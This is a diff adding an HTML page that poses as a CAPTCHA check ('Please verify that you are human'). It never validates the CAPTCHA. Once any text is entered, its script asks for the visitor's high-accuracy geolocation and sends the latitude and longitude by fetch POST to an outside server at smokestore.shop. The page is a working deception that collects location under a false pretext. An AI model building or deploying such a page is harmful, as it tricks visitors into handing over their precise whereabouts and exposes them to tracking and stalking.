@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAPTCHA Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .captcha-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+        }
+        .captcha-title {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        .captcha-image {
+            width: 100%;
+            height: auto;
+            margin: 20px 0;
+            display: block;
+        }
+        .input-group {
+            margin: 10px 0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+<div class="captcha-container">
+    <div class="captcha-title">Please verify that you are human</div>
+    <img src="https://via.placeholder.com/250x100" alt="CAPTCHA" class="captcha-image">
+    <div class="input-group">
+        <input type="text" id="captchaInput" placeholder="Enter the text from the image" required>
+    </div>
+    <button class="button" onclick="verifyCaptcha()">Verify</button>
+</div>
+
+<script>
+    function verifyCaptcha() {
+        const input = document.getElementById('captchaInput').value;
+
+        // Check if input is valid
+        if (input) {
+            // Request high accuracy for the geolocation
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
+                enableHighAccuracy: true,
+                maximumAge: 0,
+                timeout: 50000 // Optional: Set a timeout for obtaining the position
+            });
+        } else {
+            alert("Please enter the CAPTCHA text.");
+        }
+    }
+
+    function successCallback(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        alert(`Latitude: ${latitude}, Longitude: ${longitude}`);
+        sendLocationToServer(latitude, longitude);
+    }
+
+    function errorCallback(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                alert("User denied the request for Geolocation.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                alert("Location information is unavailable.");
+                break;
+            case error.TIMEOUT:
+                alert("The request timed out.");
+                break;
+            case error.UNKNOWN_ERROR:
+                alert("An unknown error occurred.");
+                break;
+        }
+    }
+
+    function sendLocationToServer(latitude, longitude) {
+        fetch('https://smokestore.shop:8000/send-location', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ latitude, longitude })
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Location sent successfully to server!");
+            } else {
+                console.error("Error sending location to server:", response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error("Error sending location:", error);
+        });
+    }
+</script>
+
+</body>
+</html>
